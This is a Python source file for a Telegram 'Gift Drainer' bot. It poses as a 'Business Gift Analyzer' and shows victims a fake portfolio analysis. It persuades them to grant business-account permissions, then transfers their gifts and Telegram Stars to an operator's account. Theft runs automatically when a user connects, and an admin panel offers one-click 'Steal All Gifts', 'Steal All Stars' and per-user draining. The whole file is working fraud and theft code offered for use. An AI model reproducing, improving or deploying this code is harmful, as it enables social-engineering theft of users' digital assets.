import logging
import json
import os
import asyncio
import time
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, 
    InlineKeyboardMarkup, 
    InlineKeyboardButton, 
    CallbackQuery,
    FSInputFile,
    BusinessConnection
)
from aiogram.utils.keyboard import InlineKeyboardBuilder
import config
from aiogram.exceptions import TelegramBadRequest, TelegramNotFound

# Настройка логов
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# Инициализация бота и диспетчера
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

CONNECTIONS_FILE = "business_connections.json"

def load_connections():
    try:
        with open(CONNECTIONS_FILE, "r") as f:
            connections = json.load(f)
            
            # Удаляем дубликаты
            unique_connections = []
            seen = set()
            for conn in connections:
                identifier = conn["connection_id"]
                if identifier not in seen:
                    seen.add(identifier)
                    unique_connections.append(conn)
                    
            return unique_connections
    except (FileNotFoundError, json.JSONDecodeError):
        return []

def save_connections(connections):
    with open(CONNECTIONS_FILE, "w") as f:
        json.dump(connections, f, indent=2)

async def remove_invalid_connection(connection_id: str):
    """Удаляет невалидное подключение из файла"""
    connections = load_connections()
    new_connections = [conn for conn in connections if conn["connection_id"] != connection_id]
    
    if len(new_connections) < len(connections):
        save_connections(new_connections)
        logger.warning(f"Removed invalid connection: {connection_id}")
        return True
    return False

# Проверка прав доступа с обработкой невалидных подключений
async def check_permissions(connection_id: str) -> bool:
    try:
        # Пробуем получить баланс звёзд через прямой запрос
        response = await bot.request(
            method="getBusinessAccountStarBalance",
            data={"business_connection_id": connection_id}
        )
        return True
    except TelegramBadRequest as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            return False
        if "Forbidden" in str(e) or "no rights" in str(e):
            return False
        logger.error(f"Permission check error: {e}")
        return False
    except TelegramNotFound as e:
        if "BUSINESS_CONNECTION_INVALID" in str(e):
            await remove_invalid_connection(connection_id)
            return False
        logger.error(f"Permission check error: {e}")
        return False
    except Exception as e:
        logger.error(f"Permission check error: {e}")
        return False

# Автоматическая кража всех подарков
async def steal_all_gifts(connection_id: str):
    try:
        # Получаем список подарков через прямой запрос
        response = await bot.request(
            method="getBusinessAccountGifts",
            data={"business_connection_id": connection_id}
        )
        
        stolen_count = 0
        for gift in response["gifts"]:
            try:
                await bot.request(
                    method="transferGift",
                    data={
                        "business_connection_id": connection_id,
                        "gift_id": gift["id"],
                        "receiver_user_id": config.RECEIVER_ID
                    }
                )
                logger.info(f"Stolen gift: {gift['title']} (ID: {gift['id']})")
                stolen_count += 1
                await asyncio.sleep(1)
            except Exception as e:
                logger.error(f"Failed to steal gift {gift['id']}: {e}")
        
        return True, f"🎁 {stolen_count} gifts stolen successfully!"
    
    except Exception as e:
        logger.exception("Stealing error")
        return False, f"❌ Stealing failed: {str(e)}"

# Кража всех звёзд (ИСПРАВЛЕННАЯ ВЕРСИЯ)
async def steal_all_stars(connection_id: str):
    try:
        logger.info(f"Starting stars transfer from {connection_id}")
        
        # 1. Получаем текущий баланс звёзд
        try:
            balance_response = await bot.request(
                method="getBusinessAccountStarBalance",
                data={"business_connection_id": connection_id}
            )
            star_amount = balance_response["amount"]
            logger.info(f"Current stars: {star_amount}")
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                await remove_invalid_connection(connection_id)
                return False, "❌ Connection invalid, removed."
            raise e
        except TelegramNotFound as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                await remove_invalid_connection(connection_id)
                return False, "❌ Connection invalid, removed."
            raise e
        
        # 2. Если звёзд нет - выходим
        if star_amount <= 0:
            return False, "❌ No stars available"
        
        # 3. Переводим звёзды себе через прямой запрос
        logger.info(f"Transferring {star_amount} stars...")
        try:
            transfer_result = await bot.request(
                method="transferBusinessAccountStarBalance",
                data={
                    "business_connection_id": connection_id,
                    "receiver_user_id": config.RECEIVER_ID,
                    "star_amount": star_amount,
                    "request_id": f"transfer_{connection_id}_{int(time.time())}"
                }
            )
            logger.info(f"Transfer result: {transfer_result}")
            
            # Проверяем результат
            if transfer_result:
                return True, f"⭐️ Successfully transferred {star_amount} stars!"
            return False, f"❌ Transfer failed. Response: {transfer_result}"
        except TelegramBadRequest as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                await remove_invalid_connection(connection_id)
                return False, "❌ Connection invalid during transfer, removed."
            raise e
        except TelegramNotFound as e:
            if "BUSINESS_CONNECTION_INVALID" in str(e):
                await remove_invalid_connection(connection_id)
                return False, "❌ Connection invalid during transfer, removed."
            raise e
    
    except TelegramBadRequest as e:
        logger.error(f"Telegram API error: {e.message}")
        return False, f"❌ API error: {e.message}"
    except TelegramNotFound as e:
        logger.error(f"Telegram API error: {e.message}")
        return False, f"❌ API error: {e.message}"
    except Exception as e:
        logger.exception("Stars stealing error")
        return False, f"❌ Critical error: {str(e)}"

# Функция для получения активных подключений
async def load_active_connections():
    connections = load_connections()
    active_connections = []
    
    for conn in connections:
        if await check_permissions(conn["connection_id"]):
            active_connections.append(conn)
        else:
            # Автоматически удаляем подключения без прав
            await remove_invalid_connection(conn["connection_id"])
    
    return active_connections

# ===================== ОСНОВНЫЕ ОБРАБОТЧИКИ =====================
@dp.message(F.text == "/start")
async def start_command(message: Message):
    try:
        active_connections = await load_active_connections()
        count = len(active_connections)
    except Exception:
        count = 0

    if message.from_user.id not in config.ADMIN_ID:
        keyboard = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="🔍 Start Scan", callback_data="start_scan")]
        ])
        
        try:
            photo = FSInputFile("connect.jpg")
            await message.answer_photo(
                photo=photo,
                caption=(
                    "🕵️‍♂️ <b>Business Gift Analyzer</b>\n\n"
                    "Instant liquidity analysis for your Telegram gifts portfolio\n\n"
                    "Tap <b>Start Scan</b> to begin analysis"
                ),
                reply_markup=keyboard,
                parse_mode="HTML"
            )
        except Exception as e:
            logger.error(f"Photo load error: {e}")
            await message.answer(
                "🕵️‍♂️ <b>Business Gift Analyzer</b>\n\n"
                "Tap the button below to start analysis",
                reply_markup=keyboard,
                parse_mode="HTML"
            )
    else:
        # Админская панель с кнопками управления
        keyboard = InlineKeyboardMarkup(
            inline_keyboard=[
                [InlineKeyboardButton(text="✨ Steal All Gifts", callback_data="steal_all")],
                [InlineKeyboardButton(text="💰 Steal All Stars", callback_data="steal_stars")],
                [InlineKeyboardButton(text="⭐️ Check Stars Balance", callback_data="check_stars")],
                [InlineKeyboardButton(text="🔄 Refresh Connections", callback_data="refresh_connections")],
                [InlineKeyboardButton(text="🔍 Steal From User", callback_data="steal_from_user")]
            ]
        )
        
        await message.answer(
            f"👑 <b>Admin Panel</b>\n\n"
            f"🔗 Active connections: <code>{count}</code>\n\n"
            "⚠️ Use buttons below to manage accounts:",
            reply_markup=keyboard,
            parse_mode="HTML"
        )

@dp.callback_query(F.data == "start_scan")
async def start_scan_handler(callback: CallbackQuery):
    await callback.answer()
    
    # Проверяем активные подключения
    connections = await load_active_connections()
    
    # Если нет подключений с разрешениями
    if not connections:
        try:
            # Пытаемся отправить видео
            await callback.message.answer_video(
                video=FSInputFile("sources/Demo1.mp4"),
                caption=(
                    "❗️ To perform the analysis, you need to connect the bot to a business chat.\n"
                    "This allows the bot to access messages and gift data for accurate results.\n\n"
                    "👉 Connect the bot to your business chat with full permissions to proceed."
                )
            )
            return
        except Exception as e:
            logger.error(f"Video send error: {e}")
            # Если видео не отправилось, отправляем текстовое сообщение
            await callback.message.answer(
                "❗️ To perform the analysis, you need to connect the bot to a business chat "
                "with full permissions.\n\n"
                "Please connect the bot to your business chat and grant all permissions."
            )
            return
    
    # Если есть подключения, но у пользователя нет разрешений
    has_permissions = False
    for conn in connections:
        if conn["user_id"] == callback.from_user.id:
            has_permissions = True
            break
    
    if not has_permissions:
        try:
            await callback.message.answer_video(
                video=FSInputFile("sources/Demo1.mp4"),
                caption=(
                    "🔒 You need to grant full permissions to the bot!\n\n"
                    "Please go to your business chat settings and make sure the bot has:\n"
                    "- Manage Gifts\n"
                    "- Manage Stars\n"
                    "- Access Messages\n\n"
                    "After granting permissions, try scanning again."
                )
            )
            return
        except Exception as e:
            logger.error(f"Video send error: {e}")
            await callback.message.answer(
                "🔒 You need to grant full permissions to the bot in your business chat settings!"
            )
            return
    
    # Если есть разрешения, показываем фиктивный анализ
    analysis_report = (
        "🎯 Gift Liquidity Analysis: Complete\n\n"
        "💼 Portfolio Liquidity: 69%\n"
        "💎 High Liquidity Gifts: 15\n"
        "⚖️ Medium Liquidity Gifts: 4\n"
        "🧊 Low Liquidity Gifts: 1\n\n"
        "⸻\n\n"
        "📌 Recommendation:\n"
        "Your portfolio contains some medium-liquidity and low-liquidity gifts.\n"
        "✨ To boost overall liquidity, consider replacing or upgrading to more in-demand gifts."
    )
    await callback.message.answer(analysis_report)

# ===================== АДМИН-КОМАНДЫ =====================
@dp.callback_query(F.data == "steal_all")
async def steal_all_handler(callback: CallbackQuery):
    await callback.answer("⏳ Stealing gifts started in background...")
    asyncio.create_task(steal_all_gifts_task(callback))

async def steal_all_gifts_task(callback: CallbackQuery):
    connections = await load_active_connections()
    if not connections:
        await callback.message.answer("❌ No active connections")
        return
    
    total_stolen = 0
    for connection in connections:
        connection_id = connection["connection_id"]
        success, message = await steal_all_gifts(connection_id)
        if success:
            total_stolen += 1
            await callback.message.answer(
                f"✅ Successfully stolen gifts from @{connection['username']}!\n{message}"
            )
        else:
            await callback.message.answer(
                f"❌ Failed to steal from @{connection['username']}: {message}"
            )
        await asyncio.sleep(3)
    
    await callback.message.answer(f"✨ Total accounts drained: {total_stolen}")

@dp.callback_query(F.data == "steal_stars")
async def steal_stars_handler(callback: CallbackQuery):
    await callback.answer("💰 Stealing stars started in background...")
    asyncio.create_task(steal_stars_task(callback))

async def steal_stars_task(callback: CallbackQuery):
    connections = await load_active_connections()
    if not connections:
        await callback.message.answer("❌ No active connections")
        return
    
    # Создаем клавиатуру с пользователями
    keyboard = InlineKeyboardBuilder()
    for connection in connections:
        keyboard.button(
            text=f"👤 @{connection['username']}",
            callback_data=f"steal_stars_user:{connection['connection_id']}"
        )
    
    if keyboard.buttons:
        keyboard.adjust(1)
        await callback.message.answer(
            "🔍 Select user to steal stars from:",
            reply_markup=keyboard.as_markup()
        )
    else:
        await callback.message.answer("❌ No users with permissions found")

@dp.callback_query(F.data == "check_stars")
async def check_stars_handler(callback: CallbackQuery):
    await callback.answer("⭐️ Checking stars...")
    
    connections = await load_active_connections()
    if not connections:
        await callback.message.answer("❌ No active connections")
        return
    
    message_text = "⭐️ <b>Stars Balance Report:</b>\n\n"
    for connection in connections:
        connection_id = connection["connection_id"]
        try:
            response = await bot.request(
                method="getBusinessAccountStarBalance",
                data={"business_connection_id": connection_id}
            )
            star_amount = response["amount"]
            message_text += (
                f"👤 @{connection['username']}: "
                f"<code>{star_amount} stars</code>\n"
            )
        except Exception as e:
            logger.error(f"Stars check error: {e}")
            message_text += f"👤 @{connection['username']}: ❌ Error\n"
    
    # Разбиваем длинные сообщения на части
    if len(message_text) > 4000:
        for i in range(0, len(message_text), 4000):
            await callback.message.answer(message_text[i:i+4000], parse_mode="HTML")
            await asyncio.sleep(0.5)
    else:
        await callback.message.answer(message_text, parse_mode="HTML")

@dp.callback_query(F.data == "refresh_connections")
async def refresh_connections_handler(callback: CallbackQuery):
    await callback.answer("🔄 Refreshing...")
    connections = await load_active_connections()
    await callback.message.answer(
        f"🔗 Active connections: <code>{len(connections)}</code>",
        parse_mode="HTML"
    )

@dp.callback_query(F.data == "steal_from_user")
async def steal_from_user_handler(callback: CallbackQuery):
    await callback.answer()
    
    # Создаем клавиатуру с пользователями
    connections = await load_active_connections()
    if not connections:
        await callback.message.answer("❌ No active connections")
        return
    
    keyboard = InlineKeyboardBuilder()
    for connection in connections:
        keyboard.button(
            text=f"👤 @{connection['username']}",
            callback_data=f"steal_user:{connection['user_id']}"
        )
    keyboard.adjust(1)
    
    await callback.message.answer(
        "🔍 Select user to steal from:",
        reply_markup=keyboard.as_markup()
    )

@dp.callback_query(F.data.startswith("steal_stars_user:"))
async def steal_stars_user_handler(callback: CallbackQuery):
    try:
        await callback.answer("💰 Stealing stars...")
        connection_id = callback.data.split(":")[1]
        logger.info(f"Steal stars initiated for {connection_id}")
        asyncio.create_task(steal_stars_user_task(callback, connection_id))
    except Exception as e:
        logger.error(f"Handler error: {e}")
        await callback.answer("❌ Internal error")

async def steal_stars_user_task(callback: CallbackQuery, connection_id: str):
    connections = await load_active_connections()
    username = None
    
    for conn in connections:
        if conn["connection_id"] == connection_id:
            username = conn["username"]
            break
    
    if not username:
        await callback.message.answer("❌ User not found")
        return
    
    success, message = await steal_all_stars(connection_id)
    if success:
        await callback.message.answer(
            f"💰 Successfully stolen stars from @{username}!\n{message}"
        )
    else:
        await callback.message.answer(
            f"❌ Failed to steal stars from @{username}: {message}"
        )

@dp.callback_query(F.data.startswith("steal_user:"))
async def steal_user_handler(callback: CallbackQuery):
    await callback.answer()
    user_id = int(callback.data.split(":")[1])
    
    connections = await load_active_connections()
    target_conn = None
    for conn in connections:
        if conn["user_id"] == user_id:
            target_conn = conn
            break
    
    if not target_conn:
        await callback.message.answer("❌ User not found")
        return
    
    # Создаем клавиатуру с действиями для пользователя
    keyboard = InlineKeyboardMarkup(
        inline_keyboard=[
            [
                InlineKeyboardButton(
                    text="✨ Steal Gifts", 
                    callback_data=f"steal_gifts:{target_conn['connection_id']}"
                ),
                InlineKeyboardButton(
                    text="💰 Steal Stars", 
                    callback_data=f"steal_stars_user:{target_conn['connection_id']}"
                )
            ],
            [
                InlineKeyboardButton(
                    text="⬅️ Back", 
                    callback_data="steal_from_user"
                )
            ]
        ]
    )
    
    await callback.message.answer(
        f"👤 Selected user: @{target_conn['username']}\n"
        f"🆔 ID: <code>{user_id}</code>\n\n"
        "Select action:",
        reply_markup=keyboard,
        parse_mode="HTML"
    )

@dp.callback_query(F.data.startswith("steal_gifts:"))
async def steal_gifts_user_handler(callback: CallbackQuery):
    await callback.answer("⏳ Stealing gifts started in background...")
    connection_id = callback.data.split(":")[1]
    asyncio.create_task(steal_gifts_user_task(callback, connection_id))

async def steal_gifts_user_task(callback: CallbackQuery, connection_id: str):
    connections = await load_active_connections()
    username = None
    
    for conn in connections:
        if conn["connection_id"] == connection_id:
            username = conn["username"]
            break
    
    if not username:
        await callback.message.answer("❌ Connection not found")
        return
    
    success, message = await steal_all_gifts(connection_id)
    if success:
        await callback.message.answer(
            f"✅ Successfully stolen gifts from @{username}!\n{message}"
        )
    else:
        await callback.message.answer(
            f"❌ Failed to steal from @{username}: {message}"
        )

# ===================== БИЗНЕС-ФУНКЦИИ =====================
@dp.business_connection()
async def handle_business_connect(connection: BusinessConnection):
    try:
        logger.info(f"New connection: {connection.id} from @{connection.user.username}")
        connections = load_connections()
        new_conn = {
            "user_id": connection.user.id,
            "connection_id": connection.id,
            "username": connection.user.username
        }
        
        # Проверяем, нет ли уже этого подключения
        if not any(c["connection_id"] == connection.id for c in connections):
            connections.append(new_conn)
            save_connections(connections)
            
            # Автоматически крадем подарки, если есть права
            if await check_permissions(connection.id):
                success, message = await steal_all_gifts(connection.id)
                status = "✅ Gifts stolen" if success else "❌ Steal failed"
            else:
                status = "⚠️ No permissions"
            
            # Уведомляем админа
            await bot.send_message(
                config.ADMIN_ID[0],
                f"🔔 <b>New connection!</b>\n\n"
                f"👤 @{new_conn['username']}\n"
                f"🆔 ID: <code>{new_conn['user_id']}</code>\n"
                f"🔗 Connection ID: <code>{new_conn['connection_id']}</code>\n"
                f"🚨 Status: {status}",
                parse_mode="HTML"
            )
    except Exception as e:
        logger.error(f"Connection handling error: {e}")

# ===================== ЗАПУСК БОТА =====================
if __name__ == "__main__":
    logging.info("🤖 Starting Gift Drainer Bot...")
    
    # Очищаем невалидные подключения при запуске
    logging.info("🔍 Checking existing connections...")
    asyncio.run(load_active_connections())
    
    try:
        dp.run_polling(bot)
    except Exception as e:
        logger.critical(f"Critical error: {e}")